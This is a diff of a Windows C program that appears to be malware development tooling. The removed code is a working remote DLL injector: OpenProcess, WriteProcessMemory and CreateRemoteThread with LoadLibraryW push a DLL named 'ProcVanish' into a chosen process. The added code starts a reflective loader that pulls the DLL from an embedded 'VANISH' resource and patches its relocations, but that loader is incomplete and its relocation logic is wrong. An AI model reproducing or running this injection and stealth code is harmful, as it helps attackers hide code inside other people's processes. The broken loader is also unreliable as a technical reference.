@@ -1,94 +1,116 @@
-#include <Windows.h>
 #include <stdio.h>
+#include <winternl.h>
+#include <Windows.h>
+#include "resource.h"
 
-#define LOG_FILE L"C:\\Users\\cappy\\Desktop\\Logs.txt"
+typedef struct BASE_RELOCATION_BLOCK {
+    DWORD PageAddress;
+    DWORD BlockSize;
+} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;
 
-void WriteLog(const wchar_t* format, ...) {
-	va_list args;
-	va_start(args, format);
+typedef struct BASE_RELOCATION_ENTRY {
+    USHORT Offset : 12;
+    USHORT Type : 4;
+} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
 
-	// Calculate the required buffer size for the formatted string
-	int len = vswprintf(NULL, 0, format, args);
+BOOL GetDLLFromRsrc(PBYTE *pPayload, DWORD* pdwSize)
+{
 
-	va_end(args);
+    HRSRC hRsrcBlockHandle;
+    HGLOBAL hHandleToPointer;
+    DWORD dwDataSize;
+    PBYTE pAddress = NULL;
+    
+    printf("[i] Grabbing the handle to the information block of the resource... ");
+    if (!(hRsrcBlockHandle = FindResourceA(NULL, MAKEINTRESOURCEA(IDR_VANISH1), "VANISH"))) {
+        printf("FindResourceA Failed\t| %d\n", GetLastError());
+        return FALSE;
+    }
+    printf("[+] DONE!!!\n");
 
-	if (len > 0) {
-		HANDLE hfile = CreateFileW(LOG_FILE, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-		if (hfile != INVALID_HANDLE_VALUE) {
-			va_start(args, format);
-			// Allocate enough space for the formatted string plus a null terminator
-			wchar_t* buffer = (wchar_t*)malloc(len + 2);
-			vswprintf(buffer, len + 2, format, args); // Write the formatted string to the buffer
-			va_end(args);
+    printf("[i] Getting the size of the data stored inside the resource... ");
+    if (!(dwDataSize = SizeofResource(NULL, hRsrcBlockHandle)))
+    {
+        printf("SizeofResource Failed\t| %d\n", GetLastError());
+        return FALSE;
+    }
+    printf("[+] DONE!!!\n");
+    
+    printf("[i] Grabbing the handle to the pointer... ");
+    if (!(hHandleToPointer = LoadResource(NULL, hRsrcBlockHandle)))
+    {
+        printf("LoadResource Failed\t| %d\n", GetLastError());
+        return FALSE;
+    }
+    printf("[+] DONE!!!\n");
 
-			DWORD written;
-			WriteFile(hfile, buffer, wcslen(buffer) * 2, &written, NULL);
-			WriteFile(hfile, L"\r\n", 4, &written, NULL);
-			free(buffer); // Free the allocated buffer
-			CloseHandle(hfile);
-		}
-		else {
-			// Handle error
-			LPVOID lpMsgBuf;
-			DWORD dw = GetLastError();
-			FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
-				NULL, dw, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
-				(LPTSTR)&lpMsgBuf, 0, NULL);
+    if (!(pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDataSize)))
+    {
+        printf("HeapAlloc Failed\t| %d\n", GetLastError());
+        return FALSE;
+    }
 
-			WriteLog(L"Failed to create log file. Error: ");
-			WriteLog((char*)lpMsgBuf);
-			LocalFree(lpMsgBuf);
-		}
-	}
+    memcpy(pAddress, hHandleToPointer, dwDataSize);
+
+    *pdwSize = dwDataSize;
+    *pPayload = pAddress;
+    
+    return TRUE;
 }
 
-int main(int argc, char *argv[]) {
+BOOL ParsingHeaders(IN PBYTE pFile, IN DWORD dwSize) {
 
-	HANDLE hProcess = NULL;
-	PVOID remoteBuff = NULL;
-	wchar_t dllPath[] = TEXT("C:\\Users\\cappy\\Documents\\Projects\\Dlls\\ProcVanish\\x64\\Release\\ProcVanish.dll");
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pFile;
+    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
+        return FALSE;
 
-	if (argc < 2) {
-		printf("[*] USAGE: \"%s\" <PID>\n", argv[0]);
-	}
+    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(pFile + pDosHeader->e_lfanew);
+    if (pNtHdrs->Signature != IMAGE_NT_SIGNATURE)
+        return FALSE;
 
-	
+    IMAGE_DATA_DIRECTORY importDir = pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+    DWORD_PTR relocationTable = importDir.VirtualAddress + (DWORD)pFile;
+    DWORD relocationsProcessed = 0;
 
-	// open handle to process
-	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi(argv[1]));
-	if (hProcess == INVALID_HANDLE_VALUE) {
-		printf("[!] OpenProcess failed with error : %d\n", GetLastError());
-		return -1;
-	}
-	printf("[+] Found remote process\n");
+    while (relocationsProcessed < importDir.Size)
+    {
+        PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
+        relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
+        DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
+        PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);
 
-	// Allocate mem in the target proc
-	remoteBuff = VirtualAllocEx(hProcess, NULL, sizeof(dllPath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	if (remoteBuff == NULL) {
-		printf("[!] VirtualAllocEx failed with error : %d\n", GetLastError());
-		return -1;
-	}
-	printf("[+] Successfully Allocated Memory At 0x%p\n", remoteBuff);
+        for (DWORD i = 0; i < relocationsCount; i++)
+        {
+            relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);
+
+            if (relocationEntries[i].Type == 0)
+            {
+                continue;
+            }
+
+            DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
+            DWORD_PTR addressToPatch = 0;
+            ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)pFile + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
+            memcpy((PVOID)((DWORD_PTR)pFile + relocationRVA), &pFile, sizeof(DWORD_PTR));
+        }
+    }
+    
+}
+
+int main(void) {
+
+    PBYTE pData = NULL;
+    DWORD dwSize = 0;
+
+    if (!GetDLLFromRsrc(&pData, &dwSize)) {
+        return -1;
+    }
+    printf("[i] DLL Stored At\t| 0x%p | SIZE %d\n", pData, dwSize);
 
 
-	// Write the DLL path to othe allocated memory
-	if (!WriteProcessMemory(hProcess, remoteBuff, (LPVOID)dllPath, sizeof(dllPath), NULL)) {
-		printf("[!} WriteProcessMem failed %d\n", GetLastError());
-		return -1;
-	}
-	printf("[+] Successfully Wrote Dll Path\n");
-
-	// Load the dll into the target process
-	PTHREAD_START_ROUTINE start = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
-	if (!CreateRemoteThread(hProcess, NULL, 0, start, remoteBuff, 0, NULL)) {
-		printf("[!] CreateRemoteThread Failed with error : %d\n");
-		return -1;
-	}
-	printf("[+] Dll Executed\n");
-
-	printf("[#] Press Enter To Quit\n");
-	getchar();
-
-	CloseHandle(hProcess);
-	return 0;
+    
+    printf("[#] Press <Enter> To Quit...\n");
+    getchar();
+    
+    return 0;
 }
